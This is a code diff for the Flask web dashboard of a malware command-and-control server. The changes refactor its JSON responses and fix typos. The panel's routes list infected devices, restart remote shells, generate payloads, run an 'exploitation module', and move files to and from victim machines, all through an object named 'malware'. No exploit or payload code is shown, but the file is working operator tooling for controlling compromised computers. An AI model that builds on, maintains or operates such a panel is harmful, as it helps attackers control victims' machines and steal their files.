@@ -1,5 +1,4 @@
-import json
-from flask import Flask, render_template, request, redirect, send_from_directory, session, url_for, jsonify, Response
+from flask import Flask, render_template, request, redirect, send_from_directory, session, url_for, jsonify
 import eventlet
 import socketio
 from c2 import C2
@@ -88,10 +87,9 @@ def post():
     try:
         if not is_logged_in():
             return redirect(url_for('login'))
-        return Response("{'result':'"+malware.list_all_devices()+"'}", status=200, mimetype='application/json')
+        return jsonify(result=malware.list_all_devices()), 200
     except Exception as err:
-        return Response("{'result':'"+str(err)+"'}", status=500, mimetype='application/json')
-
+        return jsonify(result=str(err)), 500
 
 @app.route("/delete", methods=["POST"])
 def delete():
@@ -100,9 +98,9 @@ def delete():
             return redirect(url_for('login'))
         data = request.get_json()
         malware.delete_device(data["device_id"])
-        return Response("{'result':'Device deleted successfuly'}", status=200, mimetype='application/json')
+        return jsonify(result='Device deleted successfully'), 200
     except Exception as err:
-        return Response("{'result':'"+str(err)+"'}", status=500, mimetype='application/json')
+        return jsonify(result=str(err)), 500
 
 @app.route("/ctrl", methods=["POST"])
 def ctrl():
@@ -111,9 +109,9 @@ def ctrl():
             return redirect(url_for('login'))
         data = request.get_json()
         malware.ctrl(data["device_id"])
-        return Response("{'result':'Shell restarted successfuly'}", status=200, mimetype='application/json')
+        return jsonify(result='Shell restarted successfully'), 200
     except Exception as err:
-        return Response("{'result':'"+str(err)+"'}", status=500, mimetype='application/json')
+        return jsonify(result=str(err)), 500
 
 @app.route("/payload", methods=["POST"])
 def payload1():
@@ -122,10 +120,9 @@ def payload1():
             return redirect(url_for('login'))
         data = request.get_json()
         malware.payload(data)
-        return Response("""{'result':'Payload has started generating.
-This may take upwards of 5 minutes.'}""", status=200, mimetype='application/json')
+        return jsonify(result='Payload has started generating. This may take upwards of 5 minutes.'), 200
     except Exception as err:
-        return Response("{'result':'"+str(err)+"'}", status=500, mimetype='application/json')
+        return jsonify(result=str(err)), 500
 
 @app.route("/download", methods=["POST"])
 def download1():
@@ -134,19 +131,18 @@ def download1():
             return redirect(url_for('login'))
         data = request.get_json()
         threading.Thread(target=malware.generate, args=(data,)).start()
-        return Response("""{'result':'Payload has started generating.
-This may take upwards of 5 minutes.'}""", status=200, mimetype='application/json')
+        return jsonify(result='Payload has started generating. This may take upwards of 5 minutes.'), 200
     except Exception as err:
-        return Response("{'result':'"+str(err)+"'}", status=500, mimetype='application/json')
+        return jsonify(result=str(err)), 500
 
 @app.route("/list_payloads", methods=["POST"])
 def list_payloads():
     if not is_logged_in():
         return redirect(url_for('login'))
     try:
-        return str(os.listdir("payloads"))
+        return jsonify(result=os.listdir("payloads")), 200
     except:
-        return "[]"
+        return jsonify(result=[]), 500
 
 @app.route("/explotation_module", methods=["POST"])
 def send_explotation_module():
@@ -155,10 +151,9 @@ def send_explotation_module():
             return redirect(url_for('login'))
         data = request.get_json()
         malware.explotation_module(data)
-        return Response("""{'result':'Payload executed succesfuly.
-Note, this may still mean that the payload failed during execution'}""", status=200, mimetype='application/json')
+        return jsonify(result='Payload executed successfully. Note, this may still mean that the payload failed during execution'), 200
     except Exception as err:
-        return Response("{'result':'"+str(err)+"'}", status=500, mimetype='application/json')
+        return jsonify(result=str(err)), 500
 
 @app.route("/upload_file", methods=["POST"])
 def upload_file():
@@ -167,9 +162,9 @@ def upload_file():
             return redirect(url_for('login'))
         data = request
         malware.upload_file(data)
-        return Response("{'result':'File uploaded successfuly'}", status=200, mimetype='application/json')
+        return jsonify(result='File uploaded successfully'), 200
     except Exception as err:
-        return Response("{'result':'"+str(err)+"'}", status=500, mimetype='application/json')
+        return jsonify(result=str(err)), 500
 
 @app.route("/download_file", methods=["POST"])
 def download_file():
@@ -178,9 +173,9 @@ def download_file():
             return redirect(url_for('login'))
         data = request.get_json()
         malware.download_file(data)
-        return Response("{'result':'File downloaded successfuly'}", status=200, mimetype='application/json')
+        return jsonify(result='File downloaded successfully'), 200
     except Exception as err:
-        return Response("{'result':'"+str(err)+"'}", status=500, mimetype='application/json')
+        return jsonify(result=str(err)), 500
 
 @app.route("/get_downloaded_files/<path:filename>")
 def get_downloaded_files(filename):
@@ -193,9 +188,9 @@ def list_files():
     if not is_logged_in():
         return redirect(url_for('login'))
     try:
-        return str(os.listdir("files_saved"))
+        return jsonify(result=os.listdir("files_saved")), 200
     except:
-        return "[]"
+        return jsonify(result=[]), 500
 
 # Route for logging in
 @app.route("/login", methods=["GET", "POST"])
